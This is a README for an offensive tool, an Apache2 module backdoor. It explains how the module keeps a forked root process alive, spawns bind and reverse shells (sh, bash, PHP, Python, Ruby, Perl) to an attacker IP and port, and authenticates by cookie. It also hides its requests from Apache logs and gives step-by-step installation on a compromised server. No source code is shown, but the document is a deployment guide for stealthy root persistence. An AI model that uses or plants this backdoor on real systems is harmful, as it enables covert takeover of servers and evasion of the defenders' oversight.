# Apache2 mod_backdoor
Apache2 Module Backdoor is a stealth backdoor using an Apache2 module.<br/>
The main idea is to fork() the main Apache2 process just after it has loaded its config.
Since it's forked before the root user transfers the process to www-data, you can execute command as root.<br/>
As Apache2 loads its configuration only when you (re)start it, the challenge was to never let die this 
forked root apache2 process, to let us interact as root with the compromised system.

# Features

* Bind TTY Shell
* Reverse Shell (TTY , native, PHP, Perl, Python, Ruby)
* High stability and reliability, each shell spawns a new forked independent root process attached to PID 1
* Socks5 proxy
* Password Protection through cookie headers
* Ping module to know if its still active

There is also a hook to bypass the Apache2 logging mechanism. Each request to the backdoor module **are not logged** by Apache2.

# Demo
***COMING SOON***

# Description

The password is passed through Cookie headers: `Cookie: password=backdoor`. It's defined with `#define` 
in the beginning of mod_backdoor.c, so you could easily edit it.<br/>

Each following requests must contain this password to interact with the module.<br/>
Each request containing this cookie will not be logged by Apache if the module is running. <br/>
<br/>
Each shell spawns in its own process, attached to PID 1 and removed from apache2 cgroup.
 It means it's possible to restart/stop apache2.service from a spawned shell (not true for 
 TTY shells because I need an apache2 process to do the bidirectional communication between socket
 and tty). It also improves stealth, shells are no longer related to apache2.service. <br/>

### Bind TTY Shell
The endpoint  `http[s]://<TARGET>/bind/<PORT>` bind a listening port on `<TARGET>:<PORT>` <br/>
When a connection is initiated to the listening port, the port closes. <br/>
I've used forkpty() to obtain a native TTY shell, working with an IPC UNIX socket to communicate 
between forked TTY process and the new socket you just opened.<br/>
They could be easily upgraded with the famous trick:<br/>
 `CTRL-Z --> stty raw -echo --> fg --> reset`

### Reverse TTY Shell
It works like the bind shell, the endpoint `http[s]://<TARGET>/revtty/<IP>/<PORT>` returns a TTY
shell to `<IP>:<PORT>` <br/>


### Reverse Shell (No TTY)
The endpoint `http[s]://<TARGET>/reverse/<IP>/<PORT>/<PROG>` returns a shell to `<IP>:<PORT>`. <br/>
`<PROG>` must be one of these: <br/>

| Native   | External  |    
| :------: | :--------:|
|   sh     |    php    |
|   bash   |    python |
|   dash   |    ruby   |
|   ash    |    perl   |
|   tcsh   |           |
|   ksh    |           |

`<PROG>` must be in lower-case.<br/>
PHP uses the `exec` function.<br/>
Ruby isn't using `/bin/sh`.

### Socks5 proxy
TODO

### Ping module
The endpoint `http[s]://<TARGET>/ping` tell you if the module is currently working.

# Notes
You could easily edit the different endpoints and the password. It is defined by constants 
at the beginning of `mod_backdoor.c`.<br/>
Apache2 Module Backdoor is inspired from Ringbuilder, created by Juan Manuel Fernandez ([@TheXC3LL](https://twitter.com/TheXC3LL))<br/>
More info about Ringbuilder:<br/>
https://github.com/TarlogicSecurity/mod_ringbuilder <br/>
https://www.tarlogic.com/en/blog/backdoors-modulos-apache/ <br/>

Socks5 code was adapted from https://github.com/fgssfgss/socks_proxy <br/>

# Builds
For development :<br/>
* `apxs -i -a -c mod_backdoor.c -Wl,-lutil` <br/>
 -Wl,-lutil used to link mod_backdoor.so with libutil.so to use forkpty() from <pty.h>
* `systemctl restart apache2`

On a compromised server :<br/>
* Compile it like above for the desired arch and retrieve the mod_backdoor.so
* Copy mod_backdoor.so to `/usr/lib/apache2/modules/mod_backdoor.so`
* Create `/etc/apache2/mod-available/backdoor.load` --> <br/>
 `LoadModule backdoor_module /usr/lib/apache2/modules/mod_backdoor.so`
* `a2enmod backdoor` --> `systemctl restart apache2`

# Author
Vlad Rico ([@RicoVlad](https://twitter.com/RicoVlad))
